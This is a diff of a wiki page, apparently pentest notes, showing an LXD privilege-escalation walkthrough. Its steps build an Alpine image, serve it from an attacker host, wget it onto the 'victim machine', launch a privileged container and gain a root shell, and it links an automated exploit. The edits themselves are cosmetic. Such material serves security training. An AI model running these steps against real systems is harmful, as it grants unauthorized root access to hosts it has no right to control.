@@ -2,7 +2,7 @@
 title: Escape Docker, LXD
 description: 
 published: true
-date: 2023-06-17T16:57:13.542Z
+date: 2023-06-17T17:14:35.242Z
 tags: 
 editor: ckeditor
 dateCreated: 2023-06-17T16:57:13.542Z
@@ -153,6 +153,7 @@ systemctl daemon-reload &amp;&amp; systemctl restart docker
 <pre><code class="language-plaintext">git clone https://github.com/saghul/lxd-alpine-builder
 cd lxd-alpine-builder/
 sudo ./build-alpine</code></pre>
+<p>&nbsp;</p>
 <figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?resize=810%2C243&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?resize=1024%2C307&amp;ssl=1 1024w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?resize=300%2C90&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?resize=768%2C230&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?resize=400%2C120&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?resize=100%2C30&amp;ssl=1 100w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?w=1034&amp;ssl=1 1034w" sizes="100vw" width="810"></figure>
 <p>If during this the build an error comes up, that could mean the mirrors used are not valid. Simply edit the rootfs/usr/share/alpine-mirrors/MIRRORS.txt file and remove all of the mirrors apart from the first one:</p>
 <figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=810%2C650&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?w=842&amp;ssl=1 842w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=300%2C241&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=768%2C617&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=822%2C660&amp;ssl=1 822w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=400%2C321&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=436%2C350&amp;ssl=1 436w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=72%2C58&amp;ssl=1 72w" sizes="100vw" width="810"></figure>
@@ -161,12 +162,14 @@ sudo ./build-alpine</code></pre>
 sudo python -m SimpleHTTPServer 80
 #Download the image remotely using Wget
 wget http://X.X.X.X/alpine-vX.XX-1686-XXXXXXXX_XXXX.tar.gz</code></pre>
+<p>&nbsp;</p>
 <figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-13.png?resize=810%2C274&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-13.png?w=849&amp;ssl=1 849w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-13.png?resize=300%2C101&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-13.png?resize=768%2C260&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-13.png?resize=400%2C135&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-13.png?resize=100%2C34&amp;ssl=1 100w" sizes="100vw" width="810"></figure>
 <p>The next step is to import the image using the LXC command-line tool. It’s important doing this from YOUR HOME directory on the victim machine, or it might fail.</p>
 <pre><code class="language-plaintext">lxc image import ./alpine.tar.gz --alias myimage </code></pre>
 <figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-9.png?resize=810%2C95&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-9.png?w=881&amp;ssl=1 881w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-9.png?resize=300%2C35&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-9.png?resize=768%2C90&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-9.png?resize=400%2C47&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-9.png?resize=100%2C12&amp;ssl=1 100w" sizes="100vw" width="810"></figure>
 <p>As suggested by LXC, before actually using the image it should be initialized and its storage pool should be configured. The default selections will work just fine:</p>
 <pre><code class="language-plaintext">lxd init</code></pre>
+<p>&nbsp;</p>
 <figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-10.png?resize=810%2C246&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-10.png?w=916&amp;ssl=1 916w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-10.png?resize=300%2C91&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-10.png?resize=768%2C233&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-10.png?resize=400%2C121&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-10.png?resize=100%2C30&amp;ssl=1 100w" sizes="100vw" width="810"></figure>
 <p>The image can then be run using the run the security.privileged flag set to true, which will grant the current user unconditioned root access to it:</p>
 <pre><code class="language-plaintext">lxc init myimage mycontainer -c security.privileged=true </code></pre>
@@ -180,5 +183,5 @@ lxc exec mycontainer /bin/sh
 </code></pre>
 <figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-17.png?resize=686%2C150&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-17.png?w=686&amp;ssl=1 686w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-17.png?resize=300%2C66&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-17.png?resize=400%2C87&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-17.png?resize=100%2C22&amp;ssl=1 100w" sizes="100vw" width="686"></figure>
 <p>This has granted a root-privilege shell on the target system.</p>
-<p>Alternatively, this automated exploit can do the heavy lifting: <a href="https://github.com/initstring/lxd_root"><u>https://github.com/initstring/lxd_root</u></a>.</p>
+<p>Alternatively, this automated exploit can do the heavy lifting: <a href="https://github.com/initstring/lxd_root"><u>https://github.com/initstring/lxd_root</u></a>.&nbsp;</p>
 <p>&nbsp;</p>
